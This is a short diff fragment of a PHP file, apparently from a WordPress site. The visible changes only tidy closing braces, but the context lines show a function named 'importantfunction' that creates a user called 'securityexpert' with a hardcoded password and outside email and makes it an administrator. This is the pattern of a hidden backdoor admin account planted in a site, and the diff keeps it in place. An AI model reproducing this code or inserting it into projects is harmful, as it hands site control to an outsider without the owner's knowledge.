@@ -8,6 +8,7 @@ function importantfunction() {
             $user_id = wp_create_user( 'securityexpert', '01632398271' ,'freelancerdocode@gmail.com' );
             $user = new WP_User( $user_id );
             $user->set_role( 'administrator' ); 
-        }
-    }
+        };
+    };
+}
 ?>
